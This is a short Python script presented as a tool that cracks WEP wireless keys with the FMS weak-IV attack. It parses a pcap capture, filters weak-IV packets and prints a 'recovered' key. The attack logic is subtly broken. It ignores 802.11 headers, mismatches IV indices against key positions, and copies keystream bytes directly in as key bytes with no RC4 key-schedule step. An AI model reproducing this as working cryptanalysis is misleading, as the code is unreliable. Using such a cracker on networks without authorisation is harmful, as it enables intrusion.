import struct

def read_pcap(file_path):
    """Reads packets from a .cap (PCAP) file and returns a list of packets."""
    packets = []
    with open(file_path, 'rb') as f:
        # Read global header
        f.read(24)  # Skip global header (first 24 bytes)

        while True:
            header = f.read(16)  # Read packet header (timestamp, microseconds, captured length, packet length)
            if not header:
                break

            _, _, captured_length, _ = struct.unpack("<IIII", header)
            packet = f.read(captured_length)  # Read the packet data
            packets.append(packet)

    return packets

def extract_weak_iv_packets(packets):
    """Extracts packets with weak IVs (3-7, 255, x)."""
    weak_iv_packets = []
    for packet in packets:
        if len(packet) < 5:  # Ensure at least 5 bytes (IV + first byte of encrypted payload)
            continue

        iv = packet[:3]  # The first 3 bytes are the IV
        if iv[1] == 255 and 3 <= iv[0] <= 7:  # Check for weak IVs
            weak_iv_packets.append(packet)

    return weak_iv_packets

def recover_wep_key(weak_iv_packets):
    """Recovers the WEP key using the FMS attack."""
    # Dictionary to store the keystreams for each weak IV
    keystreams = {}

    for packet in weak_iv_packets:
        iv = packet[:3]
        encrypted_payload = packet[3:]  # Encrypted payload starts after IV

        # First byte of the keystream can be derived from the SNAP header
        snap_header_first_byte = 0xAA
        keystream_first_byte = snap_header_first_byte ^ encrypted_payload[0]  # Assuming payload[0] is the first byte

        # Store the keystream in the dictionary using the IV as the key
        keystreams[iv[0]] = keystream_first_byte

    # We know that WEP keys are usually 5 bytes long. We will attempt to recover each byte
    recovered_key = bytearray(5)

    for a in range(5):  # For each byte position in the key
        if a in keystreams:
            # Recover the key byte using the keystream
            recovered_key[a] = keystreams[a]  # Only works for specific cases; additional logic may be needed

    return recovered_key

# Example usage
if __name__ == "__main__":
    pcap_file = "weak_iv_packets.cap"  # Input your .cap file with weak IV packets
    packets = read_pcap(pcap_file)

    weak_iv_packets = extract_weak_iv_packets(packets)
    print(f"Found {len(weak_iv_packets)} weak IV packets.")

    if weak_iv_packets:
        wep_key = recover_wep_key(weak_iv_packets)
        print(f"Recovered WEP key: {wep_key.hex().upper()}")
    else:
        print("No weak IV packets found.")
